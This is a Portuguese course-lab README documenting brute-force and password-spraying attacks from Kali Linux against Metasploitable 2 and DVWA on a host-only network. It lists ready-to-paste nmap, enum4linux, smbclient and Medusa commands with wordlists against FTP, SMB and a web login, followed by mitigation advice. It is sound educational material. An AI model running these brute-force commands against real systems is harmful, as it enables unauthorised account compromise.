# security-lab
Projeto desenvolvido como parte do curso de Cibersegurança
# 🛡️ Desafio de Cibersegurança — Ataques de Força Bruta com Kali Linux e Medusa

**Resumo:** Repositório criado para documentar a etapa prática do curso de Cibersegurança. Objetivo: executar e registrar ataques de força bruta (FTP, SMB e Web/DVWA) em ambiente controlado (Kali Linux → Metasploitable 2) e apresentar evidências e recomendações.  
**Observação importante:** nenhuma mitigação foi aplicada no laboratório — o ambiente ficou intencionalmente vulnerável para fins de aprendizado.

---

## 📘 Descrição do Desafio

Implementar, documentar e compartilhar um projeto prático utilizando **Kali Linux** e **Medusa** contra ambientes vulneráveis (ex.: **Metasploitable 2**, **DVWA**) para simular cenários de força bruta e estudar resultados.

Cenários executados:
- Força bruta em **FTP** (teste com `medusa` e acesso direto via `ftp`);
- Password spraying / brute-force em **SMB** (enumeração e tentativa de senha);
- Ataque automatizado a formulário **Web (DVWA)** usando `medusa`;
- Enumeração de serviços com **nmap** e descoberta de compartilhamentos com `smbclient` / `enum4linux`.

---

## 🎯 Objetivos de Aprendizagem

- Compreender ataques de força bruta em serviços FTP, Web e SMB;  
- Executar e registrar ataques automatizados com **Medusa**;  
- Realizar enumeração de serviços com **Nmap** e **enum4linux**;  
- Documentar procedimentos e evidências de forma técnica e organizada;  
- Propor recomendações de mitigação (não implementadas no lab).

---

Coloque as imagens na pasta `imagens/` e atualize links se necessário.

---


> Coloque as imagens na pasta `imagens/` e atualize links se necessário.

---

## 🧰 Ferramentas e versões (usadas no laboratório)

- Kali Linux  
- Medusa v2.3  
- Metasploitable 2  
- DVWA (Damn Vulnerable Web Application)  
- Nmap 7.95  
- enum4linux, smbclient, ftp

---

## 🧪 Ambiente de Teste

| Máquina        | Função   | IP                |
|----------------|----------|-------------------|
| Kali Linux     | Atacante | `192.168.77.249`  |
| Metasploitable2| Alvo     | `192.168.77.250`  |

Teste de conectividade confirmado via `ping` (ver evidência).

---

## 🔧 Comandos principais executados (prontos para copiar/colar)

### Teste de conectividade / interfaces (no alvo)
```
# Mostrar interfaces e IPs (no alvo)
ip a

# Testar conectividade com a VM atacante (no alvo)
ping 192.168.77.249

# Varredura de versão em portas relevantes
nmap -sV -p 21,22,80,139,445,137 192.168.77.250

# Enumeração completa do Samba e salvar a saída
enum4linux -a 192.168.77.250 | tee enum4_output.txt

# Enumeração completa do Samba e salvar a saída
enum4linux -a 192.168.77.250 | tee enum4_output.txt

# Listar shares do servidor SMB como usuário msfadmin
smbclient -L \\192.168.77.250 -U msfadmin

# Criar lista de usuários (cada nome em nova linha)
echo -e "user\nmsfadmin\nservice" > smn_users.txt

# Criar lista de senhas para spraying
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

# Executar Medusa contra SMB (módulo smbnt)
medusa -h 192.168.77.250 -U smn_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

# Criar listas de usuários e senhas
echo -e "user\nmsfadmin\nnadmim\nrroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

# Executar Medusa contra o formulário do DVWA
medusa -h 192.168.77.250 -U users.txt -P pass.txt -M http \
  -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
  -m PAGE:"dvwa/login.php" -m FAIL="Login failed" -t 6

# Executar brute-force FTP com medusa
medusa -h 192.168.77.250 -U users.txt -P pass.txt -M ftp -t 6

# Acessar FTP manualmente para validar credenciais encontradas
ftp 192.168.77.250

# Quando solicitado:
# Nome de usuário: msfadmin
# Senha: msfadmin
```

<img width="848" height="164" alt="spray" src="https://github.com/user-attachments/assets/7d56e278-18a5-4e55-a62e-aed581000903" />
<img width="897" height="376" alt="SMBcliente" src="https://github.com/user-attachments/assets/734f0b66-e1dd-4f0f-87ae-27f1146906bd" />
<img width="779" height="67" alt="smb" src="https://github.com/user-attachments/assets/626f09e0-c766-4fbc-9342-cf137d816fa8" />
<img width="753" height="408" alt="Pingkali" src="https://github.com/user-attachments/assets/d35d1b91-beea-4778-8173-0fa77c7c8034" />
<img width="1610" height="802" alt="Ping" src="https://github.com/user-attachments/assets/aee4d5c1-3e8d-47ea-9fcd-d4c31e8f7998" />
<img width="791" height="381" alt="Nmap" src="https://github.com/user-attachments/assets/b1e99d2f-a688-476d-a948-5ff5cfeb520c" />
<img width="760" height="74" alt="Medusa_brute" src="https://github.com/user-attachments/assets/71fe63ef-086d-4772-975f-67baab0d5a63" />
<img width="762" height="227" alt="Medusa" src="https://github.com/user-attachments/assets/46310352-7f54-4db7-a3b0-0dde8ab9a163" />
<img width="556" height="62" alt="less" src="https://github.com/user-attachments/assets/a0eaf7b6-6c39-4637-b595-6ab5c873f32a" />
<img width="371" height="173" alt="Conexão_FTP" src="https://github.com/user-attachments/assets/0a93ae88-8bcb-4bb3-96a1-15d0c8cdf787" />

---

## 🧠 Passos Realizados

1. Provisionamento das VMs (Kali + Metasploitable 2) em rede host-only;  
2. Reconhecimento e mapeamento de serviços (Nmap);  
3. Execução de ataques de força bruta com Medusa (FTP, SMB) e automação em DVWA;  
4. Coleta de logs, capturas e outputs dos comandos utilizados;  
5. Organização das evidências nas pastas do repositório.

---

## 🧾 Resultados e Evidências

- Relatórios com comandos, parâmetros e saídas estão em `/relatorios`.  
- Capturas de tela e logs em `/imagens`.  
- Wordlists e scripts em `/wordlists` e `/scripts`.

---

## ⚠️ Observação sobre Mitigações (não aplicadas)

**Durante este desafio não foram aplicadas medidas de mitigação no ambiente de laboratório.** O motivo é didático: manter recursos deliberadamente vulneráveis facilita o estudo do comportamento de ataques e a validação das técnicas de exploração.

### Implicações
- Os serviços permaneceram configurados em estados vulneráveis (senhas fracas, falta de bloqueio de tentativas, etc.).  
- Não há evidências neste repositório de medidas ativas de proteção — apenas da detecção e exploração.

---

## ✅ Recomendações (ações sugeridas — **não implementadas**)

As recomendações abaixo servem como orientações futuras para mitigar os mesmos vetores de ataque estudados:

- Implementar bloqueio/banimento temporário de IP após N tentativas falhas (fail2ban);  
- Exigir senhas fortes e políticas de expiração;  
- Implementar autenticação multifator (MFA) onde aplicável;  
- Limitar tentativas de login por conta e por IP;  
- Habilitar logs centralizados e alertas para múltiplas tentativas de autenticação;  
- Harden de serviços: desabilitar serviços desnecessários, aplicar patches, restringir acesso por firewall;  
- Educar usuários sobre phishing e engenharia social (vetor comum para credenciais);  
- Realizar varreduras periódicas e testes controlados (pentests) para avaliar a eficácia das medidas.

> Essas ações não foram aplicadas no ambiente usado para este desafio — elas constam apenas como boas práticas recomendadas.

---

## ⚠️ Aviso Legal

> Este projeto tem **fins estritamente educacionais** e foi desenvolvido em **ambiente de laboratório controlado**.  
> Nenhuma técnica ou ferramenta descrita deve ser utilizada em sistemas reais sem autorização prévia.  
> O autor não se responsabiliza por qualquer uso indevido das informações aqui apresentadas.

---

## 👤 Autor

**Pedro Henrique Perillo Vianna**  
Etapa de Avaliação — Santander - Cibersegurança 2025
 
📆 Outubro de 2025














